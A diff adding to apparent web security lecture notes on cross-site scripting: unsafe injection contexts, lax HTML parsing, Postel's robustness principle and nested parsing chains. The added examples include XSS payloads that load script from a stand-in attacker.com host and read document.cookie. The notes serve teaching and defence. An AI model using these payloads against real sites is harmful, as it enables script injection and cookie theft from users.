@@ -348,7 +348,7 @@ Parsed by the browser:
     alert(`Hi there, ${username}`)
 </script>
 ```
-
+It  is not enough to just escape strings ans '," because the parser has different properties and can trigger errors and error out the page load itself.
 ### Parsers, parsers, everywhere!
 - First, the HTML parser runs
     - Greedily searches for HTML tags
@@ -359,7 +359,7 @@ Parsed by the browser:
 
 ### Script elements
 - What is the fix?
-    - Hex encode user data to produce a string with characters 0-9, A-F.
+    - Hex encode user data to produce a string with characters 0-9, A-F. We also need to undo that which works fine using hexdecode.
     - Include it inside a JavaScript string
     - Then, decode the hex string
 
@@ -395,4 +395,76 @@ Parsed by the browser:
     alert(`Hi there, ${username}`)
 </script>
 ```
+### Contexts which are never safe
+```HTML
+<script>USER_DATA_HERE</script>
+```
+```HTML
+<!-- USER_DATA_HERE --> //Comments even as parser errors in few edge cases
+```
+```HTML
+<USER_DATA_HERE href='/'>Link</a>
+```
+```HTML
+<div USER_DATA_HERE='some value'></div>
+```
+```HTML
+<style>USER_DATA_HERE</style>
+```
+- HTML parsers are extremely lax about what they accept
+- Here is some "valid" HTML:
 
+```HTML
+<script/XSS src='https://attacker.com/xss.js'></script>
+```
+
+```HTML
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(document.cookie)>
+```
+
+```HTML
+<img """><script>alert(document.cookie)</script>">
+```
+
+```HTML
+<iframe src=https://attacker.com/path/to/some/file/xss.js <
+```
+
+It is designed based on Roubustness principle
+
+### Robustness principle
+- "Be conservative in what you send, be liberal in what you accept"
+- Also known as "Postel's law" who wrote in TCP spec:
+    - "TCP implementations should follow a general principle of robustness: be conservative in what you do, be liberal in what you accept from others."
+- This is actually terrible for security!
+    - "A flaw can become entrenched as a de facto standard. Any implementation of the protocol is required to replicate the aberrant behavior, or it is not interoperable. This is both a consequence of applying the robustness principle, and a product of a natural reluctance to avoid fatal error conditions. Ensuring interoperability in this environment is often referred to as aiming to be 'bug for bug compatible'." - Martin Thomson
+
+### Where can escaped user data safely be used?
+- HTML element bodies
+- HTML attributes (surrounded by quotes)
+- JavaScript strings
+
+### Beware nesting and parsing chains!
+```HTML
+<div onclick="setTimeout('doStuff(\'USER_DATA_HERE\')', 1000)"></div>
+```
+- Note there are three rounds of parsing!
+    - HTML parser extracts the onclick attribute and adds it to DOM2.
+    - Later, when button is clicked, JavaScript parser extracts setTimeout() syntax and executes it3.
+    - One second later, the string passed as first argument to setTimeout() is parsed as JavaScript and executed
+
+```HTML
+<div onclick="setTimeout('doStuff(\'USER_DATA_HERE\')', 1000)"></div>
+```
+- If user data is not double-encoded with JavaScript backslash sequences and then HTML encoded, then you're in trouble.
+- Better to avoid writing this kind of code!
+
+```HTML
+<script>
+    let someValue = 'USER_DATA_HERE'  
+    setTimeout("doStuff('" + someValue + "')", 1000)
+</script>
+```
+- Escaping assignment to someValue is relatively easy
+- But easy to forget to further escape the setTimeout construction!
+- Better to avoid writing this kind of code!
